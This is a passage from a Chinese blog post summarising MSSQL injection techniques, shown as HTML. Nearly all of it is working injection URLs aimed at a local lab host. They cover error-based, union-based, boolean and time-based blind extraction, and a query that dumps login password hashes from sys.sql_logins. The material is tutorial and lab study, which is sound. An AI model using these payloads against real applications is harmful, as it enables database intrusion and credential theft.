+<h3 id="获取当前表名，列名"><a href="#获取当前表名，列名" class="headerlink" title="获取当前表名，列名"></a>获取当前表名，列名</h3><p>选择列表中的列 <code>&#39;users.username&#39;</code> 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。<br>依次按报错信息加入字段，遍历列名。 </p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?<span class="attr">id=</span><span class="number">1</span>' having <span class="number">1</span>=<span class="number">1</span>--</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?<span class="attr">id=</span>-<span class="number">1</span>' <span class="keyword">group</span> <span class="title">by</span> users.id having <span class="number">1</span>=<span class="number">1</span>--</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?<span class="attr">id=</span>-<span class="number">1</span>' <span class="keyword">group</span> <span class="title">by</span> users.id,users.usernae having <span class="number">1</span>=<span class="number">1</span>--</span><br></pre></td></tr></table></figure>
+
+<h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=convert(int,(<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> <span class="keyword">users</span> ))<span class="comment">--</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/<span class="keyword">less</span><span class="number">-1.</span>asp?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=convert(int,(select top 1 password from users ))--</span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> * <span class="keyword">from</span> test..users <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">''</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="带括号"><a href="#带括号" class="headerlink" title="带括号"></a>带括号</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.189.128:8001/less-3.asp?id=1') and 1=1--</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.189.128:8001/less-3.asp?id=1) and 1=1--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><p>order by 判断列数</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>--</span><br></pre></td></tr></table></figure>
+<p>利用占位符回显数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="literal">null</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>查询表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span>  information_schema.tables <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'emails'</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/<span class="keyword">less</span><span class="number">-1.</span>asp?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select 1,2,table_name from  information_schema.tables where table_name not in('</span>emails<span class="string">','</span>referers<span class="string">')--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables),<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>查询列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name  <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'emails'</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/<span class="keyword">less</span><span class="number">-1.</span>asp?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select 1,2,column_name  from information_schema.columns where table_name='</span>emails<span class="string">' and column_name not in('</span>email_id<span class="string">')--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'emails'</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'email_id'</span>)),<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>列数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and ascii(substring((<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)) &gt;= <span class="number">119</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/less<span class="number">-1.</span>asp?id=<span class="number">1</span><span class="string">';if (select IS_SRVROLEMEMBER('</span>sysadmin<span class="string">'))=1 WAITFOR DELAY '</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">5</span><span class="string">'--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span>;<span class="keyword">if</span> (ascii(substring((<span class="keyword">select</span> top <span class="number">1</span> <span class="type">name</span> <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">1</span> WAITFOR DELAY <span class="string">'0:0:5'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="查询管理员信息"><a href="#查询管理员信息" class="headerlink" title="查询管理员信息"></a>查询管理员信息</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,master.dbo.fn_varbintohexstr(password_hash),<span class="number">3</span> <span class="keyword">from</span> sys.sql_logins<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mssql注入总结"><span class="toc-number">1.</span> <span class="toc-text">Mssql注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#默认数据库"><span class="toc-number">1.1.1.</span> <span class="toc-text">默认数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释"><span class="toc-number">1.1.2.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空白字符"><span class="toc-number">1.1.3.</span> <span class="toc-text">空白字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#权限判断"><span class="toc-number">1.1.4.</span> <span class="toc-text">权限判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用信息"><span class="toc-number">1.1.5.</span> <span class="toc-text">常用信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表和列个数"><span class="toc-number">1.1.6.</span> <span class="toc-text">表和列个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库凭据"><span class="toc-number">1.1.7.</span> <span class="toc-text">数据库凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">1.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数"><span class="toc-number">1.2.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断xp-cmdshell是否存在"><span class="toc-number">1.2.2.</span> <span class="toc-text">判断xp_cmdshell是否存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断是否为sa"><span class="toc-number">1.2.3.</span> <span class="toc-text">判断是否为sa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断是否为db-ownwer"><span class="toc-number">1.2.4.</span> <span class="toc-text">判断是否为db_ownwer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库机器名"><span class="toc-number">1.2.5.</span> <span class="toc-text">数据库机器名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库版本"><span class="toc-number">1.2.6.</span> <span class="toc-text">爆数据库版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#当前数据库用户名"><span class="toc-number">1.2.7.</span> <span class="toc-text">当前数据库用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据库名"><span class="toc-number">1.2.8.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取当前数据库名"><span class="toc-number">1.2.9.</span> <span class="toc-text">获取当前数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取表个数"><span class="toc-number">1.2.10.</span> <span class="toc-text">获取表个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取所有表名"><span class="toc-number">1.2.11.</span> <span class="toc-text">获取所有表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看表中有多少数据"><span class="toc-number">1.2.12.</span> <span class="toc-text">查看表中有多少数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取所有列名"><span class="toc-number">1.2.13.</span> <span class="toc-text">获取所有列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取当前表名，列名"><span class="toc-number">1.2.14.</span> <span class="toc-text">获取当前表名，列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#列数据"><span class="toc-number">1.2.15.</span> <span class="toc-text">列数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#带括号"><span class="toc-number">1.2.16.</span> <span class="toc-text">带括号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union注入"><span class="toc-number">1.3.</span> <span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">1.4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">1.4.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.4.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询管理员信息"><span class="toc-number">1.5.</span> <span class="toc-text">查询管理员信息</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&text=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&is_video=false&description=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mssql注入小结&body=Check out this article: http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&name=mssql注入小结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&t=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 ceeeeeeb
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
